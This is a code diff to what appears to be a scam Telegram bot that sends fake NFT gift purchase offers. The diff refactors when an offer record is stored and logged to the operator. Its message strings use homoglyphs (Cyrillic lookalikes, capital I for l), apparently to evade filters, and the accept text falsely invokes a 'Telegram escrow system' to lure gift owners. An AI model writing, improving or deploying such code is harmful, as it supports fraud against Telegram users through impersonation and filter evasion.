@@ -305,12 +305,7 @@ async def handle_offer(message: Message) -> None:
     text = f"Usеr <b>{message.from_user.full_name if message.from_user else 'Unknown'}</b> оffеrs уоu <b>{amount_fmt}</b> {emoji} fоr thе gift {gift_display}.\n\nТhе оffеr ls vаIid fоr <b>6 h. 0 min</b>.."
 
     offer_id = uuid.uuid4().hex[:12]
-    offers[offer_id] = {
-        **data, "bc_id": bc_id, "chat_id": message.chat.id, "accepted": False,
-        "sender_name": sender_name, "sender_username": sender_username, "sender_id": sender_id,
-        "owner_username": "unknown", "owner_id": "0",
-    }
-
+    
     keyboard = InlineKeyboardMarkup(
         inline_keyboard=[[
             InlineKeyboardButton(text="Decline", callback_data=f"dec:{offer_id}", icon_custom_emoji_id=EMOJI_DECLINE_EN),
@@ -320,8 +315,16 @@ async def handle_offer(message: Message) -> None:
 
     try:
         sent = await send_with_fallback(bc_id=bc_id, chat_id=message.chat.id, text=text, reply_markup=keyboard)
-        offers[offer_id]["msg_id"] = sent.message_id
+        
+        # Сохраняем оффер ТОЛЬКО после успешной отправки
+        offers[offer_id] = {
+            **data, "bc_id": bc_id, "chat_id": message.chat.id, "accepted": False,
+            "sender_name": sender_name, "sender_username": sender_username, "sender_id": sender_id,
+            "owner_username": "unknown", "owner_id": "0", "msg_id": sent.message_id
+        }
+        
         await send_log_to_admin(offers[offer_id])
+        
     except Exception as e:
         logger.error(f"[offer-send] Ошибка: {e}")
 
@@ -357,7 +360,6 @@ async def handle_accept(callback: CallbackQuery) -> None:
 
     order_id = f"ТG-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
     
-    # Твой новый текст (без ссылки в скобках, ссылка внутри gift_display)
     accept_text = (
         f"<b>NFТ Dеаl</b>\n\n<b>Оrdеr</b> #{order_id}\n\n"
         f"Тhе buуеr hаs rеsеrvеd <b>{amount_fmt}</b> {emoji} thrоugh thе ТеIеgrаm еsсrоw sуstеm. "
